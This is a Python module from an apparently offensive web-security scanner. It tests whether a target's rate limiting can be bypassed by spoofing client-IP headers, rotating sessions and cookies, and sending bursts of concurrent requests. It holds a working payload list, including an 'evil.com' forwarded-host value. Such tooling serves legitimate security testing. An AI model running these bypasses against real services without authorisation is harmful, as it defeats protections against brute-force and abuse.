"""Rate Limit Bypass Module — advanced bypass techniques.

A real attacker doesn't just test rate limiting.
They bypass it.

This module:
1. IP rotation (X-Forwarded-For, X-Real-IP)
2. Header manipulation
3. Session rotation
4. Parameter pollution
5. Encoding bypasses
6. Distributed testing
"""

from __future__ import annotations

import asyncio
from dataclasses import dataclass
from typing import Any

from titan.core.logger import get_logger
from titan.core.models import AttackType, Finding, Severity

logger = get_logger("detector")


@dataclass
class RateLimitPayload:
    """A rate limit bypass payload."""

    name: str
    technique: str
    headers: dict[str, str]
    params: dict[str, str]
    severity: Severity
    confidence: float


class RateLimitBypassTester:
    """Advanced rate limit bypass testing."""

    BYPASS_PAYLOADS = [
        RateLimitPayload(
            name="xff_original",
            technique="header_manipulation",
            headers={"X-Forwarded-For": "1.2.3.4"},
            params={},
            severity=Severity.MEDIUM,
            confidence=0.70,
        ),
        RateLimitPayload(
            name="xff_loopback",
            technique="header_manipulation",
            headers={"X-Forwarded-For": "127.0.0.1"},
            params={},
            severity=Severity.MEDIUM,
            confidence=0.70,
        ),
        RateLimitPayload(
            name="xff_internal",
            technique="header_manipulation",
            headers={"X-Forwarded-For": "10.0.0.1"},
            params={},
            severity=Severity.MEDIUM,
            confidence=0.70,
        ),
        RateLimitPayload(
            name="x_real_ip",
            technique="header_manipulation",
            headers={"X-Real-IP": "5.6.7.8"},
            params={},
            severity=Severity.MEDIUM,
            confidence=0.70,
        ),
        RateLimitPayload(
            name="cf_connecting_ip",
            technique="header_manipulation",
            headers={"CF-Connecting-IP": "9.10.11.12"},
            params={},
            severity=Severity.MEDIUM,
            confidence=0.65,
        ),
        RateLimitPayload(
            name="true_client_ip",
            technique="header_manipulation",
            headers={"True-Client-IP": "13.14.15.16"},
            params={},
            severity=Severity.MEDIUM,
            confidence=0.65,
        ),
        RateLimitPayload(
            name="x_client_ip",
            technique="header_manipulation",
            headers={"X-Client-IP": "17.18.19.20"},
            params={},
            severity=Severity.MEDIUM,
            confidence=0.65,
        ),
        RateLimitPayload(
            name="x_forwarded_host",
            technique="header_manipulation",
            headers={"X-Forwarded-Host": "evil.com"},
            params={},
            severity=Severity.LOW,
            confidence=0.55,
        ),
        RateLimitPayload(
            name="session_rotation",
            technique="session_rotation",
            headers={},
            params={"session": "new"},
            severity=Severity.MEDIUM,
            confidence=0.60,
        ),
        RateLimitPayload(
            name="cookie_rotation",
            technique="cookie_rotation",
            headers={"Cookie": "session=rotated_value"},
            params={},
            severity=Severity.MEDIUM,
            confidence=0.60,
        ),
        RateLimitPayload(
            name="url_encoding",
            technique="encoding",
            headers={},
            params={},
            severity=Severity.LOW,
            confidence=0.55,
        ),
        RateLimitPayload(
            name="double_encoding",
            technique="encoding",
            headers={},
            params={},
            severity=Severity.LOW,
            confidence=0.55,
        ),
    ]

    def __init__(self, context: Any = None):
        self.context = context
        self._findings: list[Finding] = []

    async def test_bypass(
        self,
        target_url: str,
        url: str,
        method: str = "GET",
        auth_headers: dict[str, str] | None = None,
    ) -> list[Finding]:
        """Test rate limit bypass techniques."""
        findings = []

        # First, check if rate limiting exists
        baseline = await self._send_request(url, method, auth_headers)
        if baseline and baseline.get("status") == 429:
            # Rate limited — test bypasses
            for payload in self.BYPASS_PAYLOADS:
                try:
                    headers = {**(auth_headers or {}), **payload.headers}
                    response = await self._send_request(url, method, headers)

                    if response and response.get("status") != 429:
                        finding = Finding(
                            target=target_url,
                            url=url,
                            method=method,
                            param="rate_limit_bypass",
                            location="header",
                            payload=str(payload.headers),
                            attack_type=AttackType.BUSINESS_LOGIC,
                            severity=payload.severity,
                            verified=True,
                            confidence=payload.confidence,
                            status=response.get("status", 0),
                            body=response.get("body", "")[:2000],
                            diffs=[f"ratelimit:{payload.name}"],
                            notes=f"Rate limit bypass: {payload.name} ({payload.technique})",
                        )
                        findings.append(finding)
                except Exception as exc:
                    logger.debug(f"variant failed, continuing: {exc}")
                    continue

        # Test rapid requests without bypass
        try:
            tasks = [self._send_request(url, method, auth_headers) for _ in range(20)]
            responses = await asyncio.gather(*tasks, return_exceptions=True)

            success_count = sum(
                1 for r in responses if not isinstance(r, Exception) and r and r.get("status") in (200, 201, 202)
            )

            if success_count >= 18:
                finding = Finding(
                    target=target_url,
                    url=url,
                    method=method,
                    param="no_rate_limit",
                    location="body",
                    payload="20 rapid requests",
                    attack_type=AttackType.BUSINESS_LOGIC,
                    severity=Severity.HIGH,
                    verified=True,
                    confidence=0.85,
                    status=200,
                    body=f"{success_count}/20 requests succeeded",
                    diffs=["ratelimit:no_rate_limit"],
                    notes=f"No rate limiting: {success_count}/20 requests succeeded",
                )
                findings.append(finding)
        except Exception as exc:
            logger.debug(f"suppressed exception: {exc}")
            pass

        self._findings.extend(findings)
        return findings

    async def _send_request(
        self,
        url: str,
        method: str,
        headers: dict[str, str] | None = None,
    ) -> dict[str, Any] | None:
        try:
            import aiohttp

            async with aiohttp.ClientSession() as session:
                h = headers or {}
                async with session.request(method, url, headers=h, timeout=aiohttp.ClientTimeout(total=5)) as resp:
                    return {"status": resp.status, "body": await resp.text(), "headers": dict(resp.headers)}
        except Exception:
            return None

    def get_findings(self) -> list[Finding]:
        return self._findings
